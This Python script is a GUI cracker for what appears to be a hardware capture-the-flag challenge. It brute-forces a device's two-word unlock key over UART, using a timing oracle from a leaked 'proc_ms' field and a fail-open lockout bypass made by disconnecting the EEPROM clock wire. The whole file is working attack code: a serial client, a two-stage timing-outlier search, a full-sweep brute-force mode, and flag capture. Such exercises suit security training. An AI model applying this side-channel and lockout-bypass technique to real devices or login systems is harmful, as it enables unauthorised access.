#!/usr/bin/env python3
"""GUI for Challenge 5: the proc_ms timing-oracle attack over UART.

Prereq (hardware): disconnect the EEPROM *SCL* wire so the fail-counter write
NAKs (FAILOPEN) and the 1-strike lockout never fires. You then have ~8 s before
the diagnostic watchdog declares BUS FAULT LOCKDOWN and rotates the password, so
the attack races that window.

Method (software): the deny response leaks proc_ms. The key check is not
constant-time, so the correct FIRST name takes ~30 ms longer than the rest.
  Stage 1  sweep `unlock_key {name}-__invalid__`, find the timing outlier.
  Stage 2  fix the first name, sweep `unlock_key {first}-{name}` until unlocked.

Pure stdlib (tkinter + raw termios serial), no pyserial needed.
Close any `screen`/`picocom` session first - the port can't be shared.
"""

import json
import os
import queue
import select
import statistics
import termios
import threading
import time
import tty
from pathlib import Path

import tkinter as tk
from tkinter import ttk, filedialog, messagebox


DEFAULT_WORDLIST = (
    Path(__file__).resolve().parents[1] / "firmware/5-lockout/minions_wordlist.txt"
)


# --------------------------------------------------------------------------- #
# Serial gateway (raw termios, same approach as brute_ch5.py)                  #
# --------------------------------------------------------------------------- #
class Gateway:
    def __init__(self, path: str, baud: int = termios.B115200):
        self.fd = os.open(path, os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
        tty.setraw(self.fd)
        attrs = termios.tcgetattr(self.fd)
        attrs[4] = baud  # ispeed
        attrs[5] = baud  # ospeed
        termios.tcsetattr(self.fd, termios.TCSANOW, attrs)
        self.buffer = bytearray()

    def close(self):
        try:
            os.close(self.fd)
        except OSError:
            pass

    def drain(self):
        """Discard any pending bytes (banner, previous replies)."""
        try:
            while True:
                r, _, _ = select.select([self.fd], [], [], 0)
                if not r:
                    break
                if not os.read(self.fd, 4096):
                    break
        except OSError:
            pass
        self.buffer.clear()

    def query(self, line: str, timeout: float = 0.4) -> dict:
        os.write(self.fd, line.encode() + b"\n")
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            while b"\n" in self.buffer:
                raw, _, self.buffer = self.buffer.partition(b"\n")
                text = raw.strip().decode("utf-8", "replace")
                if "{" in text and "}" in text:
                    text = text[text.find("{"): text.rfind("}") + 1]
                try:
                    message = json.loads(text)
                except (ValueError, UnicodeDecodeError):
                    continue
                if isinstance(message, dict) and "status" in message:
                    return message
            ready, _, _ = select.select(
                [self.fd], [], [], max(0.0, deadline - time.monotonic())
            )
            if ready:
                chunk = os.read(self.fd, 4096)
                if chunk:
                    self.buffer.extend(chunk)
        raise TimeoutError(f"no JSON reply for {line!r}")


# --------------------------------------------------------------------------- #
# Attack worker thread                                                        #
# --------------------------------------------------------------------------- #
class AttackWorker(threading.Thread):
    def __init__(self, device, baud, names, threshold, timeout, out: queue.Queue,
                 stop_evt: threading.Event, mode: str = "oracle"):
        super().__init__(daemon=True)
        self.device = device
        self.baud = baud
        self.names = names
        self.threshold = threshold
        self.timeout = timeout
        self.out = out
        self.stop_evt = stop_evt
        self.mode = mode  # "oracle" = proc_ms timing attack, "sweep" = blind full brute

    def emit(self, kind, **kw):
        self.out.put((kind, kw))

    @staticmethod
    def _bus_bad(reply: dict) -> bool:
        reason = str(reply.get("reason", ""))
        return "bus_fault" in reason or reply.get("status") == "locked"

    def run(self):
        start = time.monotonic()
        gw = None
        try:
            self.emit("log", msg=f"Opening {self.device} @ {self.baud} baud ...")
            gw = Gateway(self.device, baud=getattr(termios, f"B{self.baud}"))
            gw.drain()
            self.emit("log", msg="Port open. Make sure EEPROM SCL is disconnected.")
            if self.mode == "sweep":
                self._run_sweep(gw, start)
            else:
                self._run_oracle(gw, start)
        except FileNotFoundError:
            self.emit("error", msg=f"No such device: {self.device}")
        except PermissionError:
            self.emit("error", msg=f"Permission denied on {self.device} "
                                   "(are you in the 'dialout' group?)")
        except OSError as e:
            self.emit("error", msg=f"Serial error: {e} "
                                   "(is screen/picocom still holding the port?)")
        except TimeoutError as e:
            self.emit("error", msg=f"{e}  (wrong baud, or no CLI output?)")
        finally:
            if gw is not None:
                gw.close()
            self.emit("done")

    # -- mode A: proc_ms timing oracle (fast, ~2*N guesses) ----------------- #
    def _run_oracle(self, gw, start):
        self.emit("stage", text="Stage 1/2  -  finding FIRST name (timing oracle)")
        samples = []  # (ms, name)
        first = None
        for i, name in enumerate(self.names, 1):
            if self.stop_evt.is_set():
                self.emit("log", msg="Stopped by user.")
                return
            reply = gw.query(f"unlock_key {name}-__invalid__", self.timeout)
            if self._bus_bad(reply):
                self.emit("bus", reply=reply)
                return
            try:
                ms = float(reply["proc_ms"])
            except (KeyError, TypeError, ValueError):
                self.emit("error", msg=f"reply has no proc_ms: {reply}")
                return
            samples.append((ms, name))
            self.emit("timing", name=name, ms=ms, idx=i,
                      total=len(self.names), elapsed=time.monotonic() - start)
            values = [v for v, _ in samples]
            if len(values) >= 2:
                baseline = statistics.median(sorted(values)[: len(values) // 2])
                if max(values) - baseline >= self.threshold:
                    first = max(samples)[1]
                    self.emit("first", name=first, ms=max(samples)[0],
                              baseline=baseline)
                    break
        if first is None:
            self.emit("error", msg="No timing outlier found (try lowering the "
                                   "threshold, or the window may have closed).")
            return
        self.emit("stage", text=f"Stage 2/2  -  first='{first}', finding SECOND name")
        for i, name in enumerate(self.names, 1):
            if self.stop_evt.is_set():
                self.emit("log", msg="Stopped by user.")
                return
            reply = gw.query(f"unlock_key {first}-{name}", self.timeout)
            if self._bus_bad(reply):
                self.emit("bus", reply=reply)
                return
            self.emit("second", name=name, idx=i, total=len(self.names),
                      elapsed=time.monotonic() - start)
            if reply.get("status") == "unlocked" or "flag" in reply:
                self.emit("flag", first=first, second=name, reply=reply,
                          elapsed=time.monotonic() - start)
                return
        self.emit("error", msg="Second name not found before wordlist exhausted.")

    # -- mode B: blind full sweep (no timing) ------------------------------- #
    def _run_sweep(self, gw, start):
        total = len(self.names) * len(self.names)
        self.emit("stage", text=f"Full sweep (no timing)  -  up to {total} guesses")
        self.emit("sweep_total", total=total)
        tried = 0
        for first in self.names:
            for second in self.names:
                if self.stop_evt.is_set():
                    self.emit("log", msg="Stopped by user.")
                    return
                tried += 1
                reply = gw.query(f"unlock_key {first}-{second}", self.timeout)
                if self._bus_bad(reply):
                    self.emit("bus", reply=reply)
                    return
                self.emit("sweep", first=first, second=second, tried=tried,
                          total=total, elapsed=time.monotonic() - start)
                if reply.get("status") == "unlocked" or "flag" in reply:
                    self.emit("flag", first=first, second=second, reply=reply,
                              elapsed=time.monotonic() - start)
                    return
        self.emit("error", msg=f"Exhausted all {tried} pairs without unlocking.")


# --------------------------------------------------------------------------- #
# GUI                                                                         #
# --------------------------------------------------------------------------- #
class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Challenge 5  -  Minions Gateway Cracker")
        self.geometry("860x660")
        self.minsize(760, 560)

        self.q: queue.Queue = queue.Queue()
        self.worker = None
        self.stop_evt = threading.Event()

        self._build()
        self.after(50, self._pump)

    # ---- layout ----------------------------------------------------------- #
    def _build(self):
        pad = dict(padx=6, pady=4)

        cfg = ttk.LabelFrame(self, text="Connection")
        cfg.pack(fill="x", **pad)

        ttk.Label(cfg, text="Serial device").grid(row=0, column=0, sticky="w", padx=4, pady=4)
        self.device = tk.StringVar(value=self._guess_device())
        ttk.Entry(cfg, textvariable=self.device, width=24).grid(row=0, column=1, sticky="w")

        ttk.Label(cfg, text="Baud").grid(row=0, column=2, sticky="e", padx=4)
        self.baud = tk.StringVar(value="115200")
        ttk.Combobox(cfg, textvariable=self.baud, width=9, state="readonly",
                     values=("115200", "9600", "57600", "230400")).grid(row=0, column=3, sticky="w")

        ttk.Label(cfg, text="Wordlist").grid(row=1, column=0, sticky="w", padx=4, pady=4)
        self.wordlist = tk.StringVar(value=str(DEFAULT_WORDLIST))
        ttk.Entry(cfg, textvariable=self.wordlist, width=52).grid(row=1, column=1, columnspan=3, sticky="we")
        ttk.Button(cfg, text="Browse", command=self._browse).grid(row=1, column=4, padx=4)

        ttk.Label(cfg, text="Outlier threshold (ms)").grid(row=2, column=0, sticky="w", padx=4, pady=4)
        self.threshold = tk.StringVar(value="20")
        ttk.Entry(cfg, textvariable=self.threshold, width=8).grid(row=2, column=1, sticky="w")
        ttk.Label(cfg, text="Query timeout (s)").grid(row=2, column=2, sticky="e", padx=4)
        self.timeout = tk.StringVar(value="0.4")
        ttk.Entry(cfg, textvariable=self.timeout, width=8).grid(row=2, column=3, sticky="w")

        ttk.Label(cfg, text="Method").grid(row=3, column=0, sticky="w", padx=4, pady=4)
        self.mode = tk.StringVar(value="oracle")
        mf = ttk.Frame(cfg)
        mf.grid(row=3, column=1, columnspan=3, sticky="w")
        ttk.Radiobutton(mf, text="Timing oracle (proc_ms, ~2×157 guesses)",
                        variable=self.mode, value="oracle").pack(side="left")
        ttk.Radiobutton(mf, text="Full sweep (no timing, up to 157²)",
                        variable=self.mode, value="sweep").pack(side="left", padx=10)
        cfg.columnconfigure(1, weight=1)

        bar = ttk.Frame(self)
        bar.pack(fill="x", **pad)
        self.start_btn = ttk.Button(bar, text="▶  Start attack", command=self._start)
        self.start_btn.pack(side="left")
        self.stop_btn = ttk.Button(bar, text="■  Stop", command=self._stop, state="disabled")
        self.stop_btn.pack(side="left", padx=6)
        self.test_btn = ttk.Button(bar, text="Test (status)", command=self._test)
        self.test_btn.pack(side="left", padx=6)
        self.elapsed_lbl = ttk.Label(bar, text="", font=("TkDefaultFont", 10, "bold"))
        self.elapsed_lbl.pack(side="right")

        self.stage_lbl = ttk.Label(self, text="Idle. Disconnect EEPROM SCL, then Start.",
                                   font=("TkDefaultFont", 11, "bold"))
        self.stage_lbl.pack(fill="x", padx=10)
        self.progress = ttk.Progressbar(self, mode="determinate")
        self.progress.pack(fill="x", padx=10, pady=(0, 4))

        mid = ttk.Frame(self)
        mid.pack(fill="both", expand=True, **pad)

        tf = ttk.LabelFrame(mid, text="Stage 1 timings (proc_ms)")
        tf.pack(side="left", fill="both", expand=False)
        self.tree = ttk.Treeview(tf, columns=("name", "ms"), show="headings", height=18)
        self.tree.heading("name", text="First name")
        self.tree.heading("ms", text="proc_ms")
        self.tree.column("name", width=130, anchor="w")
        self.tree.column("ms", width=80, anchor="e")
        self.tree.tag_configure("hit", background="#c8f7c5")
        self.tree.pack(side="left", fill="both", expand=True)
        tsb = ttk.Scrollbar(tf, orient="vertical", command=self.tree.yview)
        tsb.pack(side="right", fill="y")
        self.tree.configure(yscrollcommand=tsb.set)

        lf = ttk.LabelFrame(mid, text="Log")
        lf.pack(side="left", fill="both", expand=True, padx=(6, 0))
        self.log = tk.Text(lf, wrap="word", height=18, state="disabled",
                           font=("TkFixedFont", 9))
        self.log.pack(side="left", fill="both", expand=True)
        lsb = ttk.Scrollbar(lf, orient="vertical", command=self.log.yview)
        lsb.pack(side="right", fill="y")
        self.log.configure(yscrollcommand=lsb.set)

        ff = ttk.LabelFrame(self, text="Result")
        ff.pack(fill="x", **pad)
        self.flag = tk.StringVar(value="")
        ent = ttk.Entry(ff, textvariable=self.flag, font=("TkFixedFont", 12))
        ent.pack(side="left", fill="x", expand=True, padx=4, pady=6)
        ttk.Button(ff, text="Copy", command=self._copy_flag).pack(side="left", padx=4)

    # ---- helpers ---------------------------------------------------------- #
    @staticmethod
    def _guess_device():
        for n in ("/dev/ttyUSB1", "/dev/ttyUSB0", "/dev/ttyACM0"):
            if os.path.exists(n):
                return n
        return "/dev/ttyUSB0"

    def _browse(self):
        p = filedialog.askopenfilename(title="Wordlist",
                                       initialfile=self.wordlist.get())
        if p:
            self.wordlist.set(p)

    def _copy_flag(self):
        if self.flag.get():
            self.clipboard_clear()
            self.clipboard_append(self.flag.get())

    def _logline(self, msg):
        self.log.configure(state="normal")
        self.log.insert("end", time.strftime("%H:%M:%S ") + msg + "\n")
        self.log.see("end")
        self.log.configure(state="disabled")

    def _load_names(self):
        p = Path(self.wordlist.get())
        return [ln.strip() for ln in p.read_text().splitlines() if ln.strip()]

    # ---- actions ---------------------------------------------------------- #
    def _test(self):
        dev = self.device.get().strip()
        try:
            gw = Gateway(dev, baud=getattr(termios, f"B{self.baud.get()}"))
            gw.drain()
            reply = gw.query("status", timeout=0.6)
            gw.close()
            self._logline(f"status -> {json.dumps(reply)}")
        except Exception as e:  # noqa: BLE001  (surface any failure to the user)
            messagebox.showerror("Test failed", str(e))

    def _start(self):
        if self.worker and self.worker.is_alive():
            return
        try:
            names = self._load_names()
            if not names:
                raise ValueError("wordlist is empty")
            threshold = float(self.threshold.get())
            timeout = float(self.timeout.get())
            baud = int(self.baud.get())
        except Exception as e:  # noqa: BLE001
            messagebox.showerror("Bad input", str(e))
            return

        mode = self.mode.get()
        self.tree.delete(*self.tree.get_children())
        self.flag.set("")
        self.progress.configure(maximum=len(names), value=0)
        self.stop_evt = threading.Event()
        if mode == "sweep":
            self._logline(f"Starting FULL SWEEP: up to {len(names)**2} guesses "
                          "(no timing). This will almost certainly exceed the 8 s "
                          "watchdog window.")
        else:
            self._logline(f"Starting TIMING ORACLE: {len(names)} names, "
                          f"threshold {threshold} ms.")
        self._logline("Reminder: EEPROM SCL disconnected; ~8 s before watchdog locks.")

        self.worker = AttackWorker(self.device.get().strip(), baud, names,
                                   threshold, timeout, self.q, self.stop_evt,
                                   mode=mode)
        self.worker.start()
        self.start_btn.configure(state="disabled")
        self.test_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")

    def _stop(self):
        self.stop_evt.set()
        self._logline("Stop requested ...")

    def _finish(self):
        self.start_btn.configure(state="normal")
        self.test_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")

    # ---- queue pump ------------------------------------------------------- #
    def _pump(self):
        try:
            while True:
                kind, kw = self.q.get_nowait()
                self._handle(kind, kw)
        except queue.Empty:
            pass
        self.after(50, self._pump)

    def _handle(self, kind, kw):
        if kind == "log":
            self._logline(kw["msg"])
        elif kind == "stage":
            self.stage_lbl.configure(text=kw["text"])
            self.progress.configure(value=0)
        elif kind == "timing":
            self.tree.insert("", "end", values=(kw["name"], f"{kw['ms']:.1f}"))
            self.tree.see(self.tree.get_children()[-1])
            self.progress.configure(value=kw["idx"])
            self.elapsed_lbl.configure(text=f"{kw['elapsed']:.1f}s  "
                                            f"(window ~8s)")
        elif kind == "first":
            self._logline(f"FIRST name = {kw['name']}  "
                          f"({kw['ms']:.1f} ms vs baseline {kw['baseline']:.1f} ms)")
            for iid in self.tree.get_children():
                if self.tree.item(iid, "values")[0] == kw["name"]:
                    self.tree.item(iid, tags=("hit",))
                    self.tree.see(iid)
        elif kind == "second":
            self.stage_lbl.configure(
                text=f"Stage 2/2  -  trying second name: {kw['name']}  "
                     f"({kw['idx']}/{kw['total']})")
            self.progress.configure(value=kw["idx"])
            self.elapsed_lbl.configure(text=f"{kw['elapsed']:.1f}s  (window ~8s)")
        elif kind == "sweep_total":
            self.progress.configure(maximum=kw["total"], value=0)
        elif kind == "sweep":
            self.stage_lbl.configure(
                text=f"Full sweep  -  {kw['first']}-{kw['second']}  "
                     f"({kw['tried']}/{kw['total']})")
            self.progress.configure(value=kw["tried"])
            self.elapsed_lbl.configure(text=f"{kw['elapsed']:.1f}s  (window ~8s)")
        elif kind == "flag":
            flag = kw["reply"].get("flag", json.dumps(kw["reply"]))
            self.flag.set(flag)
            self.stage_lbl.configure(
                text=f"UNLOCKED  key = {kw['first']}-{kw['second']}  "
                     f"in {kw['elapsed']:.1f}s")
            self._logline(f"*** UNLOCKED  {kw['first']}-{kw['second']} ***")
            self._logline(f"reply: {json.dumps(kw['reply'])}")
        elif kind == "bus":
            self._logline(f"WATCHDOG/LOCKOUT: {json.dumps(kw['reply'])}")
            self.stage_lbl.configure(text="Bus fault / lockout - reconnect SCL, "
                                          "reset board, re-disconnect, retry")
            messagebox.showwarning(
                "Window closed",
                "The 8 s watchdog fired (bus fault / lockout).\n\n"
                "Reconnect EEPROM SCL, reset the board, disconnect SCL again, "
                "then Start over.")
        elif kind == "error":
            self._logline("ERROR: " + kw["msg"])
            self.stage_lbl.configure(text="Error - see log")
        elif kind == "done":
            self._finish()


if __name__ == "__main__":
    App().mainloop()
